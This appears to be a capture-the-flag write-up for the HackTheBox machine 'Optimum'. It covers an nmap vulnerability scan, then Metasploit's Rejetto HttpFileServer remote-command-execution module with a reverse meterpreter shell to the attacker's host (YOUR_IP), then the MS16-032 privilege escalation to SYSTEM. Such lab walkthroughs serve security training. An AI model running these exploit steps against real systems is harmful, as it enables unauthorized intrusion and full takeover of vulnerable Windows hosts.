+++ 
title = "Optimum HTB Write up"
description = "Write up for the HTB machine 'Optimum'"
author = "greatmoves"
tags=["httpfileserver 2.3", "msfconsole", "hackthebox", "easy", "privilege escalation"]
date = 2023-05-11
+++

# 1. Inital recon

## 1.1. nmap
`nmap --script vuln 10.10.10.8`

```
PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://seclists.org/fulldisclosure/2011/Aug/175
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```

## 1.2. website recon
even though nmap reveals some vulnerabilities, we're looking for remote code execution vulnerabilities, so let's visit the web application in the browser

we can see that it is running `HttpFileServer 2.3`

# 2. msfconsole
let's start by running `search HttpFileServer 2.3` in msfconsole

```
Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```
let's use this exploit by running `use 0`

we need to set the options for the exploit
```
set rhost 10.10.10.8
set lhost YOUR_IP
```
and then `exploit` for our meterpreter shell

then we can find the user flag at `C:\Users\kostas\Desktop`

# 3. root.txt

let's try and find a vector to escalate our privileges. within our meterpreter shell run the command `run post/multi/recon/local_exploit_suggester`

and we can see `exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.` has potential

so let's use this exploit. put the current session in the background using `ctrl+z`, then run `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`

set the options
```
set lhost YOUR_IP
set session SESSION_NUMBER
```
You can check the session number using `sessions`

finally, `exploit` to run the exploit. once we have a meterpreter shell we can run `shell` and then `whoami` to confirm that we are `nt authority\system`

the root flag can be found at `C:\Users\Administrator\Desktop`